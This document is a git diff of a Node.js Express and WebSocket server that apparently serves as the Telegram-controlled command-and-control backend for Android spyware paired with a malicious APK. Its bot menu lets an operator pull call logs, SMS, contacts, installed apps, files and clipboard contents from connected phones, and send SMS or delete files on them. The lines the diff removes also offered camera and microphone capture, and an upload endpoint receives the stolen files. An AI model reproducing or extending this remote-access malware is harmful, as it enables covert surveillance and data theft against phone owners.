@@ -5,21 +5,19 @@ const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const uuid4 = require('uuid')
-const axios = require('axios')
 
 const upload = multer();
 const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = ''
-const token = ''
-const serverAddr = ''
+const chatId = 'test'
+const token = 'test'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
 app.get("/", (req, res) => {
-    res.send('<h1 style="text-align:center;">Everything ok now edit apk src 🐕l</h1>')
+    res.send('<h1 style="text-align:center;">Server uploaded successfully</h1>')
 })
 app.post("/sendFile", upload.single('file'), (req, res) => {
     var name = req.file.originalname
@@ -30,6 +28,7 @@ app.post("/sendFile", upload.single('file'), (req, res) => {
     }).catch(function (error) {
         console.log(error);
     })
+    console.log(name)
     res.send(name)
 })
 app.post("/sendText", (req, res) => {
@@ -81,12 +80,14 @@ bot.on("message", (msg) => {
         const clientCount = wss.clients.size
         if (clientCount > 0) {
             let Actions = [
-                [{text: 'Call Log 📞', callback_data: "cl"},{text: 'All Contact 👤', callback_data: "gc"}],
-                [{text: 'All Sms 💬', callback_data: "as"},{text: 'Send Sms 💬', callback_data: "ss"}],
-                [{text: 'Installed Apps 📲', callback_data: "ia"},{text: 'Device Model 📱', callback_data: 'dm'}],
-                [{text: 'Get Folder / File 📄', callback_data: 'gf'},{text: 'Delete Folder / File 🗑', callback_data: 'df'}],
-                [{text: 'Main Camera 📷', callback_data: 'cam1'},{text: 'Front Camera 🤳', callback_data: 'cam2'}],
-                [{text: 'Mic 1 🎤', callback_data: 'mi1'},{text: 'Mic 2 🎤', callback_data: 'mi2'},{text: 'Mic 3 🎤', callback_data: 'mi3'}],
+                [{text: 'Call Log 📞', callback_data: "cl"}],
+                [{text: 'All Sms 💬', callback_data: "as"}],
+                [{text: 'Send Sms 💬', callback_data: "ss"}],
+                [{text: 'All Contact 👤', callback_data: "gc"}],
+                [{text: 'Installed Apps 📲', callback_data: "ia"}],
+                [{text: 'Device Model 📱', callback_data: 'dm'}],
+                [{text: 'Get Folder / File 📄', callback_data: 'gf'}],
+                [{text: 'Delete Folder / File 🗑', callback_data: 'df'}],
                 [{text: 'Clip Board 📄', callback_data: 'cp'}],
             ]
             wss.clients.forEach((ws) => {
@@ -182,6 +183,3 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
 });
 
 // real time -------------------------------------------------------------------
-setInterval(() => {
-    axios.get(serverAddr)
-}, 120000);
